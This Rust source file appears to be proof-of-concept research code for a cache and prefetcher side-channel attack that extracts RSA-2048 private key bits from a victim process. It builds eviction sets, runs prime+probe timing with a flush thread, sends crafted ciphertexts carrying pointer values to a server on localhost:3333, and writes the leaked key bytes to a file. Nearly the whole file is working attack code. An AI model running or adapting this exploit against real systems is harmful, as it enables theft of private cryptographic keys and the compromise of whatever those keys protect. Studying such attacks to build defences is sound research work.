use crypto_attacker::*;
use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
// std lib
use std::env::args;
use std::mem::size_of;
use std::sync::atomic::Ordering;
use std::sync::atomic::compiler_fence;
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::time::Instant;
// file lib
use std::fs::{File, read_to_string};
// random value lib
use rand::{Rng, thread_rng};
// mmap lib
use mmap_rs::MmapOptions;
// P+P lib
use evict_rs::timer::Timer;
use evict_rs::MyTimer;
use evict_rs::{eviction_set_gen64,
    prime_with_dependencies, probe_with_dependencies, 
    evset_vec_to_evset, evset_vec_set_offset};
use evict_rs::allocator::Allocator;
use evict_rs::eviction_set::EvictionSet;

pub const RSA_ROLL_BACK_BITS: usize = 24;
pub const RSA_BITS_LEAK: usize = 560;
pub const RSA_KEY_SIZE: usize = 2048;
pub const RSA_NUM_PTR: usize = 7;
pub const RSA_NUM_ENTRY: usize = RSA_KEY_SIZE / 64;

pub fn prepare_ct_ptr(ct: *mut u64, pointer: u64) {
    // first bit of pointer should not be 1
    assert_eq!(pointer >> 63, 0);
    // insert pointer
    for i in 0..RSA_NUM_PTR {
        let mut pointer_tmp = pointer >> i;
        unsafe{
            if i != (RSA_NUM_PTR - 1) {
                let pointer_tmp_tmp = pointer << (63 - i);
                pointer_tmp |= pointer_tmp_tmp;
            }
            *ct.add(RSA_NUM_ENTRY-1-i) = u64::from_be(pointer_tmp);
        }
    }
}

pub fn prepare_ct_clear(ct: *mut u64) {
    for i in 0..RSA_NUM_ENTRY {
        unsafe{
            *ct.add(i) = 0;
        }
    }
}

pub fn prepare_ct_set(ct: *mut u64, position: u64) {
    // cannot interfere pointer part
    assert!(position as usize >= RSA_NUM_PTR * 63);
    // figure out which u64 slices
    let bit_idx = position % 64;
    let slice_idx = position / 64;
    // construct set gadget
    let or_gadget: u64 = 0x1 << bit_idx;
    // set the bit
    unsafe {
        let mut element_tmp: u64 = (*ct.add(RSA_NUM_ENTRY - 1 - slice_idx as usize)).swap_bytes();
        // println!("element_tmp_1:{:#x}", element_tmp);
        element_tmp |= or_gadget;
        // println!("element_tmp_2:{:#x}", element_tmp);
        *ct.add(RSA_NUM_ENTRY - 1 - slice_idx as usize) = element_tmp.swap_bytes();
    }
}

pub fn prepare_ct_unset(ct: *mut u64, position: u64) {
    // cannot interfere pointer part
    assert!(position as usize >= RSA_NUM_PTR * 63);
    // figure out which u64 slices
    let bit_idx = position % 64;
    let slice_idx = position / 64;
    // construct set gadget
    let or_gadget: u64 = 0x1 << bit_idx;
    // set the bit
    unsafe {
        let mut element_tmp: u64 = (*ct.add(RSA_NUM_ENTRY - 1 - slice_idx as usize)).swap_bytes();
        element_tmp &= !or_gadget;
        *ct.add(RSA_NUM_ENTRY - 1 - slice_idx as usize) = element_tmp.swap_bytes();
    }
}

pub fn prepare_ct_rollback(ct: *mut u64, position: u64) {
    // roll back when there are consecutive bits 1
    for i in 0..RSA_ROLL_BACK_BITS {
        prepare_ct_unset(ct, position + i as u64);
    }
}


fn rsa_hacker(
    mut stream: TcpStream,
    victim_array_cache_lines: &mut Vec<*mut u8>,
    repetitions: usize,
    pp_threshold: u64,
    num_group: usize,
    flush_ptr: *mut u64,
    victim_cl_start: u64,
    victim_cl_end: u64,
    pos_times: u64,
    neg_times: u64,
    timer: &MyTimer,
    mut bench_time_file: &File
) {
    let mut __trash: u64 = 0;
    let mut test_time: u64;
    let mut rng = thread_rng();
    let mut msg_data = [0u8; 1];

    // allocate chosen cipher array
    let mut ct_cal: [u8; RSA_KEY_SIZE / 8] = [0u8; RSA_KEY_SIZE / 8];
    let mut ct_leak: [u8; RSA_KEY_SIZE / 8] = [0u8; RSA_KEY_SIZE / 8];
    let ct_cal_ptr = ct_cal.as_mut_ptr() as *mut u64;
    let ct_leak_ptr = ct_leak.as_mut_ptr() as *mut u64;
    println!("[+] Address of CC Array (Calibration) -> {:p}", ct_cal_ptr);
    println!("[+] Address of CC Array (Leak) -> {:p}", ct_leak_ptr);


    // --------------------------------Calibration-----------------------------
    println!("--------------------------------Calibration-----------------------------");
    // Try different combination of ptr sequence / flush thread / guess number / p+p to window 0
    // Global Variable
    let mut target_addr: u64 = 0;  // Target pointer value
    let mut target_addr_page = victim_cl_start;  // Current page frame number
    let flush_ptr_value: u64 = flush_ptr as u64;  // Start addr of flush array
    let mut global_pp_idx: usize;  // P+P Evset id
    let mut pp_idx = 0;  // Current P+P Evset id
    let mut bit_idx: usize = 0;  // target bit index
    let mut result_array = vec![];  // vector to store the result
    let mut leak_result: u8 = 0;
    let mut threshold_v: Vec<u64> = vec![];
    let mut threshold_leak: u64;
    let mut profile_base_vec = vec![]; // store profile result for base
    let mut profile_atk_vec = vec![];  // store profile result for atk

    // Load possible page offsets of victim array
    let mut vbuf_offset_v = vec![];
    let vbuf_offset_str: Vec<String> = read_to_string("rsa_addr.txt").unwrap().lines().map(String::from).collect();
    println!("[+] Grab page offset of victim array from file...");
    for line in vbuf_offset_str {
        let victim_buf_offset = match u64::from_str_radix(&line[2..], 16) {
            Ok(result) => (result + 3*8) & 0x3f80,
            Err(error) => panic!("Fail to parse memory boundary {}", error)
        };
        println!("{:#x}", victim_buf_offset);
        vbuf_offset_v.push(victim_buf_offset);
    }

    // clean chosen cipher array for calibration
    prepare_ct_clear(ct_cal_ptr);
    // Contention detection
    let mut non_conflict_set = vec![];
    let mut target_ptr_offset: u64;
    let mut offest_trials: u64 = 0;
    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, vbuf_offset_v[0] as usize, 
        0, NUM_EVSETS/num_group, flush_ptr);
    // create flush thread
    let (tx, rx) = mpsc::channel();
    let _handle = thread::spawn(move || {
        unsafe{ pin_cpu(5); }
        loop {
            unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }

            match rx.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    match rx.recv() {
                        Ok(_) => {},
                        Err(_) => {break;}
                    }
                },
                Err(TryRecvError::Empty) => {}
            };
        };
    });
    // Stop flush thread
    __trash = match tx.send(__trash) {
        Ok(_) => {unsafe{ c_sleep(0, __trash) }},
        Err(_) => {panic!("Send Error");}
    };
    println!("[+] Flush thread is created!");
    let cevset_now = Instant::now();
    loop {
        target_ptr_offset = rng.gen::<u64>() & 0x3f80;
        let mut duplicate_flag = 0;
        for v_buf_idx in 0..vbuf_offset_v.len() {
            if target_ptr_offset == vbuf_offset_v[v_buf_idx] {
                println!("The same as victim array offset!");
                duplicate_flag = 1;
            }
        }
        if duplicate_flag == 1 {
            continue;
        }
        println!("[+] Set Target Pointer Offset as {:#x}", target_ptr_offset);

        // divide evset group into conflict and non-conflict
        let mut conflict_times: u64 = 0;
        let mut conflict_set = vec![];
        for i in 0..NUM_EVSETS {
            // one iteration
            // fetch prime+probe evset
            let mut result_evset: Vec<*mut u8> = Vec::new();
            evset_vec_to_evset(&victim_array_cache_lines, 
                &mut result_evset, L2_CACHE_WAYS, target_ptr_offset as usize, i);
            let evset_victim_buf = EvictionSet::new(&mut result_evset);

            let mut times_to_load_test_ptr_atk = vec![];

            // test one prime+probe evset
            for _ in 0..repetitions {
                // send request
                msg_data[0] = !(__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();

                // receive pubkey from victim (here it is only a garbage msg)
                stream.read_exact(&mut msg_data).unwrap();

                // Resume flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };

                __trash = unsafe{c_sleep(1500000, __trash)};

                compiler_fence(Ordering::SeqCst);
                __trash = prime_with_dependencies(&evset_victim_buf, __trash);
                ct_cal[0] = ct_cal[0] | (__trash & MSB_MASK) as u8;
                // send cipher text
                stream.write_all(&ct_cal).unwrap();

                // receive finish signal
                stream.read_exact(&mut msg_data).unwrap();
                __trash += msg_data[0] as u64;
                // Stop flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };

                compiler_fence(Ordering::SeqCst);

                // measure microarchitectural state
                test_time = probe_with_dependencies(timer, &evset_victim_buf, __trash);
                times_to_load_test_ptr_atk.push(test_time);
            }
            times_to_load_test_ptr_atk.sort();
            let median_test = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
            if median_test >= pp_threshold {
                conflict_times += 1;
                conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            } else {
                non_conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            }
        }
        println!("[+] Conflict set: {}; Non-conflict set: {}", conflict_set.len(), non_conflict_set.len());

        if non_conflict_set.len() <= 5 {
            println!("Number of Non-conflict set is not enough, try different page offset for target pointer");
            non_conflict_set.clear();
            offest_trials += 1;
            if offest_trials >= 3 {
                msg_data[0] = (__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();
                panic!("3 times bad conflict tests!");
            }
        } else {
            break;
        }
    }

    // Leak Main Loop (Seek for gadget and forward to leaking secret key)
    loop {
        write!(bench_time_file, "Compound Evset start searching: {} s\n", cevset_now.elapsed().as_secs()).unwrap();
        let mut gadget_flag = 0;
        // loop for different P+P channel
        loop {
            // fix prime+probe channel
            let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
            evset_vec_to_evset(&victim_array_cache_lines, 
                &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx % non_conflict_set.len()]);
            global_pp_idx = non_conflict_set[pp_idx % non_conflict_set.len()];
            assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
            let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
            println!("[+] P+P Evset {} Fixed!", pp_idx % non_conflict_set.len());

            let mut pp_bad_flag = 0;
            let mut noise_times = 0;

            // try different target addr
            let mut num_target_addr_tries = 0;
            while target_addr_page < victim_cl_end {
                target_addr = target_addr_page + target_ptr_offset;
                num_target_addr_tries += 1;
                // clean the noise counter for every 40 pointer value trials
                if num_target_addr_tries % 40 == 39 {
                    noise_times = 0;
                }
                println!("[+] Try {}: Pick Target addr:{:#x}(P+P Evset {})", num_target_addr_tries, target_addr, 
                    pp_idx % non_conflict_set.len());

                // Fill chosen cipher with pointer value
                prepare_ct_clear(ct_cal_ptr);
                prepare_ct_ptr(ct_cal_ptr, target_addr);

                let mut flush_group_idx = 0;
                let mut succeed_times = 0;
                while flush_group_idx < num_group * vbuf_offset_v.len() {
                    let now = Instant::now();
                    // chose different page offset of flush evset for different chunks of group
                    let page_offset_id: usize = flush_group_idx / num_group;
                    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, vbuf_offset_v[page_offset_id] as usize & 0x3f80,
                        flush_group_idx % num_group, NUM_EVSETS/num_group, flush_ptr);
                    println!("[+] Group {} {:#x}:", flush_group_idx, vbuf_offset_v[page_offset_id]);

                    // Initial vectors to store results
                    let mut times_to_load_test_ptr_base = vec![];
                    let mut times_to_load_test_ptr_atk = vec![];
                    // Initial mode
                    let mut mode: u64 = 0;
                    for _ in 0..repetitions*2 {
                        // 1024 -> no ptr (base) / 1023 -> ptr (atk)
                        let tog_p: u64 = (1024 & !mode) | (1023 & mode);
                        prepare_ct_set(ct_cal_ptr, tog_p);

                        // send request
                        msg_data[0] = !(__trash & MSB_MASK) as u8;
                        stream.write_all(&msg_data).unwrap();

                        // receive pubkey from victim
                        stream.read_exact(&mut msg_data).unwrap();

                        // Resume flush thread
                        __trash = match tx.send(__trash) {
                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                            Err(_) => {panic!("Send Error");}
                        };

                        __trash = unsafe{ c_sleep(1500000, __trash)};
            
                        compiler_fence(Ordering::SeqCst);
                        __trash = prime_with_dependencies(&pp_evset, __trash);
                        ct_cal[0] = ct_cal[0] | (__trash & MSB_MASK) as u8;
            
                        // send cipher text
                        stream.write_all(&ct_cal).unwrap();
            
                        // receive finish signal
                        stream.read_exact(&mut msg_data).unwrap();
                        __trash += msg_data[0] as u64;

                        // Stop flush thread
                        __trash = match tx.send(__trash) {
                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                            Err(_) => {panic!("Send Error");}
                        };

                        compiler_fence(Ordering::SeqCst);
            
                        // measure microarchitectural state
                        test_time = probe_with_dependencies(timer, &pp_evset, __trash);
                        __trash = test_time | (__trash & MSB_MASK);
                        prepare_ct_unset(ct_cal_ptr, tog_p | (__trash & MSB_MASK));
                        // store result
                        if mode==0 {
                            times_to_load_test_ptr_base.push(test_time);
                        } else {
                            times_to_load_test_ptr_atk.push(test_time);
                        }
                
                        mode = !(mode | (__trash & MSB_MASK));
                    }
                    times_to_load_test_ptr_atk.sort();
                    times_to_load_test_ptr_base.sort();
                    let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
                    let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
                    println!("Attack mode: {}", median_test_atk);
                    println!("Base mode: {}", median_test_base);

                    // only if atk mode activate DMP but base mode does not
                    if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) {
                        // skip low quality signal
                        if (median_test_atk as i32 - median_test_base as i32) < 70 {
                            continue;
                        }
                        succeed_times += 1;
                        println!("[+] Get Signal ({})", succeed_times);
                        // add profiling
                        profile_base_vec.append(&mut times_to_load_test_ptr_base);
                        profile_atk_vec.append(&mut times_to_load_test_ptr_atk);
                        threshold_v.push((median_test_atk + median_test_base) / 2);
                        if succeed_times >= 3 {
                            gadget_flag = 1;
                            println!("[+] Get Attack Gadgets!");
                            break;
                        }
                    } else if median_test_base >= pp_threshold {
                        noise_times += 1;
                        succeed_times = 0;
                        println!("[+] Noise Test Environment {}", noise_times);
                        profile_base_vec.clear();
                        profile_atk_vec.clear();
                        threshold_v.clear();
                        if noise_times >= 3 {
                            println!("[+] Try different P+P Evset!");
                            pp_bad_flag = 1;
                            break;
                        }
                    } else if median_test_atk <= pp_threshold {
                        // skip low quality signal
                        if (median_test_atk as i32 - median_test_base as i32) >= 70 {
                            continue;
                        }
                        profile_base_vec.clear();
                        profile_atk_vec.clear();
                        threshold_v.clear();
                        succeed_times = 0;
                        flush_group_idx += 1;
                        println!("[+] No signal"); 
                    }
                    let trans_dur = now.elapsed();
                    println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                        trans_dur.subsec_nanos());
                }
                if (gadget_flag == 1) || (pp_bad_flag == 1) {
                    break;
                }
                target_addr_page += NATIVE_PAGE_SIZE as u64;
            }
            if gadget_flag == 1 {
                break;
            }
            if (pp_bad_flag == 1) || (target_addr_page >= victim_cl_end) {
                target_addr_page = victim_cl_start;
                pp_idx += 1;
            }
        }
        if gadget_flag == 0 {
            println!("[+] Calibration Failure!");
            break;
        } else {
            println!("[+] Calibration Success!");
        }

        // write profile result
        let mut prof_atk_file = File::create("rsa_1.txt").unwrap();
        let mut prof_base_file = File::create("rsa_0.txt").unwrap();
        for profile_idx in 0..profile_atk_vec.len() {
            write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
            write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
        }
        println!("[+] Storing Profile Result!");

        let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
        evset_vec_to_evset(&victim_array_cache_lines, 
            &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
        let pp_evset = EvictionSet::new(&mut pp_evset_vec);
        prepare_ct_ptr(ct_leak_ptr, target_addr);
        write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();

        // --------------------------------Start Leaking-----------------------------
        println!("--------------------------------Start Leaking-----------------------------");
        threshold_leak = threshold_v.iter().sum::<u64>() / threshold_v.len() as u64;
        println!("[+] Leak Threshold: {}", threshold_leak);
        let mut noise_times = 0;
        let mut no_signal_times = 0;
        let mut signal_times = 0;
        let mut wrong_flag_0 = 0;  // consecutive bit 0
        let mut wrong_flag_1 = 0;  // consecutive bit 1
        // slow_down_mode = 0;
        while bit_idx < RSA_BITS_LEAK {
            // measure the time elapse for each window loop
            let now = Instant::now();
            let position: u64 = 1023 - bit_idx as u64;
            prepare_ct_set(ct_leak_ptr, position);
            // Initial vectors to store results
            let mut times_to_load_test_ptr_base = vec![];
            let mut times_to_load_test_ptr_atk = vec![];
            let mut mode: u64 = 0;

            // test begin
            for _ in 0..repetitions*2 {
                // 1024 -> no ptr (base) / 1023 -> ptr (atk)
                let tog_p: u64 = (1024 & !mode) | (1023 & mode);
                prepare_ct_set(ct_leak_ptr, tog_p);

                // send request
                msg_data[0] = !(__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();

                // receive pubkey from victim
                stream.read_exact(&mut msg_data).unwrap();

                // Resume flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };

                __trash = unsafe{ c_sleep(1500000, __trash)};

                compiler_fence(Ordering::SeqCst);
                __trash = prime_with_dependencies(&pp_evset, __trash);
                ct_leak[0] = ct_leak[0] | (__trash & MSB_MASK) as u8;

                // send cipher text
                stream.write_all(&ct_leak).unwrap();

                // receive finish signal
                stream.read_exact(&mut msg_data).unwrap();
                __trash += msg_data[0] as u64;

                // Stop flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
                // let traverse_sum = handle.join().unwrap();
                compiler_fence(Ordering::SeqCst);

                // measure microarchitectural state
                test_time = probe_with_dependencies(timer, &pp_evset, __trash);
                __trash = test_time | (__trash & MSB_MASK);
                prepare_ct_unset(ct_leak_ptr, tog_p | (__trash & MSB_MASK));
                // store result
                if mode==0 {
                    times_to_load_test_ptr_base.push(test_time);
                } else {
                    times_to_load_test_ptr_atk.push(test_time);
                }
        
                mode = !(mode | (__trash & MSB_MASK));
            }
            times_to_load_test_ptr_atk.sort();
            times_to_load_test_ptr_base.sort();
            let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
            let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
            println!("Attack mode: {}", median_test_atk);
            println!("Base mode: {}", median_test_base);

            let trans_dur = now.elapsed();
            println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                trans_dur.subsec_nanos());

            // Base mode should be no ptr -> no activation
            if median_test_base < threshold_leak {
                // if activate -> result is 1
                if median_test_atk > threshold_leak {
                    // skip low quality signal
                    if (median_test_atk as i32 - median_test_base as i32) < 50 {
                        continue;
                    }
                    no_signal_times = 0;
                    signal_times += 1;
                    // slow_down_mode = 1;
                    println!("[+] bit_idx: {}, get signal: {}", bit_idx, signal_times);
                    if signal_times < pos_times {
                        continue;
                    }
                    noise_times = 0;
                    leak_result = leak_result << 1;
                    // activate -> set leak_result
                    leak_result |= 0x1;
                    println!("[+] bit_idx: {} -> 1", bit_idx);
                } else {
                    // skip low quality signal
                    if (median_test_atk as i32 - median_test_base as i32) >= 50 {
                        continue;
                    }
                    signal_times = 0;
                    no_signal_times += 1;
                    println!("[+] bit_idx: {}, no signal: {}", bit_idx, no_signal_times);
                    if no_signal_times < neg_times {
                        continue;
                    }
                    noise_times = 0;
                    leak_result = leak_result << 1;
                    prepare_ct_unset(ct_leak_ptr, position);
                    println!("[+] bit_idx: {} -> 0", bit_idx);
                }
                if (bit_idx % 8) == 7 {
                    println!("[++]byte_idx: {} -> {:x}", bit_idx / 8, leak_result);
                    result_array.push(leak_result);
                    leak_result = 0;
                    if bit_idx >= 23 {
                        let last_value_1 = result_array[result_array.len()-1];
                        let last_value_2 = result_array[result_array.len()-2];
                        if (last_value_1 == 0x00) && (last_value_2 == 0x00) {
                            wrong_flag_0 = 1;
                        } else if (last_value_1 == 0xff) && (last_value_2 == 0xff) {
                            wrong_flag_1 = 1;
                        }
                    }
                }
                bit_idx += 1;
                // based on wrong flag, roll back 'result array' and bit_idx
                if wrong_flag_0 == 1 {
                    println!("[+] Consecutive bit 0, roll back {} bits!", RSA_ROLL_BACK_BITS);
                    bit_idx -= RSA_ROLL_BACK_BITS;
                    // remove last byte
                    for _ in 0..RSA_ROLL_BACK_BITS/8 {
                        result_array.remove(result_array.len()-1);
                    }
                    break;  // victim array addr change -> re-seek for flush group
                } else if wrong_flag_1 == 1 {
                    println!("[+] Consecutive bit 1, roll back {} bits!", RSA_ROLL_BACK_BITS);
                    // roll back chosen cipher
                    prepare_ct_rollback(ct_leak_ptr, position);
                    bit_idx -= RSA_ROLL_BACK_BITS;
                    // remove last byte
                    for _ in 0..RSA_ROLL_BACK_BITS/8 {
                        result_array.remove(result_array.len()-1);
                    }
                    wrong_flag_1 = 0;
                }
            } else {
                noise_times += 1;
                println!("[+] bit_idx: {} -> noisy ({})", bit_idx, noise_times);
                if noise_times >= 5 {
                    println!("[+] Too much noise! Bad Gadget!");
                    pp_idx += 1;
                    // slow_down_mode = 0;
                    break;
                }
            }
            // slow_down_mode = 0;
            no_signal_times = 0;
            signal_times = 0;
        }
        if bit_idx == RSA_BITS_LEAK {
            break;
        }
        threshold_v.clear();
    }

    // disconnect the transaction
    msg_data[0] = (__trash & MSB_MASK) as u8;
    stream.write_all(&msg_data).unwrap();
    // Display Result
    let mut result_file = File::create("rsa.txt").unwrap();
    println!("Result:");
    for i in 0..result_array.len() {
        print!("{:02x} ", result_array[i]);
        write!(result_file, "{:02x}\n", result_array[i]).unwrap();
    }
    println!("");
}


fn main() {
    let repetitions = args().nth(1).expect("Enter <repetitions>");
    let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
    let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
    let victim_cl_start = args().nth(4).expect("Enter <target ptr start>");
    let victim_cl_end = args().nth(5).expect("Enter <target ptr end>");
    let pos_times = args().nth(6).expect("Enter <how many times of positive signal can determine the guess>");
    let neg_times = args().nth(7).expect("Enter <how many times of negative signal can determine the guess>");
    let repetitions = repetitions.parse::<usize>().unwrap();
    let pp_threshold = pp_threshold.parse::<u64>().unwrap();
    let num_group = num_group.parse::<usize>().unwrap();
    assert_eq!(NUM_EVSETS % num_group, 0);
    let victim_cl_start = match u64::from_str_radix(&victim_cl_start[2..], 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    let victim_cl_end = match u64::from_str_radix(&victim_cl_end[2..], 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    let pos_times = pos_times.parse::<u64>().unwrap();
    let neg_times = neg_times.parse::<u64>().unwrap();
    println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
    println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);
    println!("[+] Positive times threshold -> {}", pos_times);
    println!("[+] Negative times threshold -> {}", neg_times);

    unsafe{ pin_cpu(4); }

    // Allocate Precise Flush buffer
    let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
    // Allocate via mmap
    let mut flush_buf_addr = MmapOptions::new(size_of_flush_buf)
        .map_mut()
        .unwrap();
    assert_eq!(size_of_flush_buf, flush_buf_addr.len());

    let flush_bytes = unsafe {
        core::slice::from_raw_parts_mut(
            flush_buf_addr.as_mut_ptr() as *mut u8,
            flush_buf_addr.len(),
        )
    };
    flush_bytes.fill(0x00);

    let flush_ptr = flush_buf_addr.as_mut_ptr() as *mut u64;

    // prepare 64 eviction set groups
    let mut bench_time_file = File::create("rsa_bench.txt").unwrap();
    println!("--------------------------------Evsets Preparation-----------------------------");
    let gen64_now = Instant::now();
    let timer = MyTimer::new();
    let mut victim_array_cache_lines: Vec<*mut u8> = Vec::new();
    let mut allocator = Allocator::new(0, NATIVE_PAGE_SIZE);
    eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
    write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();

    match TcpStream::connect("localhost:3333") {
        Ok(stream) => {
            println!("Successfully connected to server in port 3333");
            rsa_hacker(stream, &mut victim_array_cache_lines, repetitions, 
                pp_threshold, num_group, flush_ptr, victim_cl_start, victim_cl_end, 
                pos_times, neg_times, &timer, &bench_time_file);

        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
    write!(bench_time_file, "Online time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
}